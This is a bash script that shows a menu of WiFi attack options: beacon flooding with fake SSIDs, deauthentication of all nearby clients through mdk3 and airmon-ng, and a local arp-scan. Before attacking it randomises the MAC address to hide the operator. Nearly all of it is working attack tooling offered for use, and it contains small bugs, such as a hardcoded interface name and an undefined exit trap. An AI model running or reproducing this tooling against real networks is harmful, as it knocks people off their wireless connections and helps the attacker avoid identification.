#!/bin/bash

lgreen="\e[92m"
lred="\e[91m"
nc="\e[39m"

clear

while :
do
clear
echo -e $lred""
cat << "EOF"

                    .MMh:                                                    `/dN.
                     oMMMNs-                                              `/yMMM/
                     `mMMMMMd+.                                        `:yNMMMMh
                      :MMMMMMMNy/`                                   :sNMMMMMMN.
                       yMMMMMMMMMms-                              -omMMMMMMMMM/
                       .NMMMMMMMMMMMd+.       ``.....`         .+dMMMMMMMMMMMy
                        +MMMMMsyNMMMMds::+shdNNNNNNNNNNmdy+`.+hNMMMMMMhNMMMMm`
                        `dMMMMd`.+yooymNMMMMMMMMMMMMMMMMdoohNMMMMMMd+.+MMMMM/
                         -MMMMM+`+dNMMMMMMMMmdhhyyyyyhsoyNMMMMMMdso/`.NMMMMs
                          sMMMMN-mMMMMMmyssoyhdh/` `:smMMMMMMmsoymMMmo+dMMm`
                          `mMMMMy/MMdo.``/hMMMMMMms/sNMMMMmy:`-sNMMMMMmo+m:
                          ./MMMMM/o-`     `-smMMMMMNdoohy/`     .+dMMMMMm/
                         :m:hMMMMm`        .+sohNMMMMMNh/`        .+dMMMMNs`
                        +NMm-NMMMMo     `/yNMMNhosdMMMMMMmo-`     omosMMMMMh.
                       /MMMMooMMMMN- `:ymMMMMMMdo``:smMMMMMNd+.  -NMMy+NMMMMh`
                      -NMMMMs`mMMmy/smMMMMMMms:`     ./hNMMMMMNy`dMMMMs:NMMMMy
                     `dMMMMd` :yosdNMMMMMmy:.          `.odMMMMooMMMMN- /MMMMM:
                     :MMMMM: .+dNMMMMMNy/.`               `:smd:NMMMMo. `hMMMMd
                     yMMMMd-hNMMMMMNho.`                     .-dMMMMd:my:/mMMMM.
                     mMMMMsoMMMMNdsohm:                       sMMMMN:mMMMdsoyNM/
                     NMMMM+yMMdo-omMMMd`                     :MMMMMo:mMMMMMNhss:
                 `:s.mMMMMo+s:`  -MMMMM+                    `mMMMMd` ./hNMMMMMmy:`
              `-odNM/hMMMMh`      sMMMMN.                   sMMMMN-    `-odMMMMMMdo-`
           `-+hNMMMMy/MMMMM-      `mMMMMy                  :MMMMM+       ssoymMMMMMNh/.
         ./hNMMMMMNh/`mMMMMh`      /MMMMM:                `mMMMMh`      :MMNds/hNMMMMMmy:`
      ./ymMMMMMMMh+:--+sssss:------.hMMMMm`.............../hhhhh-````` -NMMMMh``-smMMMMMMdo-`
   `:ymMMMMMMMMMMMMMMMMMMMNNNNNNNNNd-NMMMMo+Nmmmmmmmmmmmmmmmddmddddddo-mMMMMm:hhhhdMMMMMMMMNh/.
`-sdMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMooMMMMN-mMMMMMMMMMMMMMMMMMMMMMMNooNMMMMd:mMMMMMMMMMMMMMMMMmy:`
.////+/++++++++oooooooosossyyyyhyyyys`mMMMMh:hhhhhhhhhhdddddmdddddy+hMMMMMy:hmmmmmmmmmmmmmmmNNNNmh+`
                          `smmmmmdo.` :MMMMM/          /hhhhh.  `:hNMMMMN+```````.``............-...
                           `/dMMMMMNy/.ymNMMm`        .NMMMMy.-odMMMMMNy.
                             `/dNMMMMMNhysoyh+        hMMMMm-dMMMMMMms-
                               `-smNMMMMMMMmdhysoooo-+MMMMM/hMMMMNh+.
                                  `:ohNNMMMMMMMMMMMm-NMMMMy+MNmy/.
                                      .-/shmmNNNNNN:hMMMMm`//-
                                          /hyyss/:-+MMMMM:
                                          `mMMMMy`.NMMMMs
                                           /MMMMM:dMMMMm`
                                            hMMMMNMMMMM:
                                            .NMMMMMMMMs
                                             oMMMMMMMd`
                                             `mMMMMMM-
                                              :MMMMMo
                                               yMMMd`
                                               .NMM-
                                                +M+
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
....................................................................................................
EOF

echo -e $lgreen" "
echo "1) Wifi spam"
echo ""
echo "2) Deauth all"
echo ""
echo "3) Deauth 1"
echo ""
echo "4) Scan"
echo ""
echo "B) Back"
read -p "-->> " player1
##############################################################################
if [[ $player1 == "1" ]]; then
clear
echo -e $lred""
echo "1) Use default word list"
echo ""
echo "2) Use your wordlist"
echo ""
echo "3) Use random SSIDs"
echo ""
read -p "-->> " wifiwl

if [[ $wifiwl == "1" ]]; then
echo "what is your interface?"
echo ""
read -p "-->>" interface

clear
echo "If you want to stop then press CTRL + C"
echo ""

echo "starting in 3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
echo "running..."

ifconfig $interface down
macchanger -r $interface
iwconfig $interface mode monitor
ifconfig $interface up
trap coolexit EXIT
mdk3 $interface b -f ./SSIDS.txt -a -s 1000
fi
if [[ $wifiwl == "2" ]]; then
echo -e $lred"Might not work!!!"
echo -e $lgreen"Please type the name of your own wordlist"
echo ""
read -p "-->>" OWN

echo "what is your interface?"
echo ""
read -p "-->>" interface

clear
echo "starting..."
echo ""
ifconfig $interface down
macchanger -r $interface
iwconfig $interface mode monitor
ifconfig $interface up
trap coolexit EXIT
mdk3 $interface b -f ./$OWN -a -s $(wc -l $OWN | cut -f1 -d ' ')
fi
if [[ $wifiwl == "3" ]]; then

echo "what is your interface?"
echo ""
read -p "-->>" interface

echo -e "How many SSIDs do you want?"
read -p "-->>" N

COUNT=1
while [ $COUNT -lt $N ] || [ $COUNT -eq $N ]; do
echo $(pwgen 14 1) >> "RANDOM_wordlist.txt"
let COUNT=COUNT+1
done
clear
echo -e "Starting process..."
echo " If you want to stop it, press CTRL+C."
echo " "
sleep 1
ifconfig $interface down
macchanger -r $interface
iwconfig $interface mode monitor
ifconfig $interface up
trap coolexit EXIT
mdk3 $interface b -f ./RANDOM_wordlist.txt -a -s $N
fi

####
fi
####
##############################################################################
if [[ $player1 == "2" ]]; then
echo "what is your interface?"
echo "might not work..."
echo ""
read -p "-->>" interface

moni="mon"
interfacemon="$interface$moni"

airmon-ng start wlan0
airmon-ng check kill
mdk3 $interfacemon d
sleep 10

fi
if [[ $player1 == "3" ]]; then
echo -e $lred"coming soon"
sleep 2
fi
if [[ $player1 == "4" ]]; then
arp-scan -l
echo ""
echo -e $lred""
read -p "Press enter to exit..."
fi
if [[ $player1 == "b" ]]; then
exit 0
fi



done
